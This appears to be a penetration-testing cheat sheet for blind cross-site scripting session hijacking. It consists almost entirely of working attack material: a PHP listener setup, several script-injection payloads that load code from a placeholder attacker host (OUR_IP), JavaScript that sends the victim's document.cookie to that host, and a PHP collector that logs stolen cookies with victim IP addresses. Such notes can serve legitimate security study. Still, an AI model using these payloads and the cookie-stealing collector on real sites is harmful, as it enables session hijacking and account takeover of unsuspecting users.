#### Session Hijacking (Cookie Stealing)

Blind XSS: vulnerability is triggered on a page we don't have access to.

**Start a listener
```
mkdir /tmp/tmpserver
cd /tmp/tmpserver
sudo php -S 0.0.0.0:80
```

Remote Scripts to test in each field:
```html
<script src="http://OUR_IP/name.js"></script>
<script src="http://OUR_IP/email.js"></script>
<script src="http://OUR_IP/phone.js"></script>
<script src="http://OUR_IP/product.js"></script>
<script src="http://OUR_IP/message.js"></script>
```
- Test for each field, including username, password, etc.
- Listener will show which field is vulnerable


Payloads to test if above payload doesn't work:
```html
<script src=http://OUR_IP></script>
'><script src=http://OUR_IP></script>
"><script src=http://OUR_IP></script>
javascript:eval('var a=document.createElement(\'script\');a.src=\'http://OUR_IP\';document.body.appendChild(a)')
<script>function b(){eval(this.responseText)};a=new XMLHttpRequest();a.addEventListener("load", b);a.open("GET", "//OUR_IP");a.send();</script>
<script>$.getScript("http://OUR_IP")</script>
```

Write to script.js on local machine (one or the other):
```javascript
document.location='http://OUR_IP/index.php?c='+document.cookie;
new Image().src='http://OUR_IP/index.php?c='+document.cookie;
```

Host php server and create index.php in /tmp/tmpserver:
```php
<?php
if (isset($_GET['c'])) {
    $list = explode(";", $_GET['c']);
    foreach ($list as $key => $value) {
        $cookie = urldecode($value);
        $file = fopen("cookies.txt", "a+");
        fputs($file, "Victim IP: {$_SERVER['REMOTE_ADDR']} | Cookie: {$cookie}\n");
        fclose($file);
    }
}
?>
```


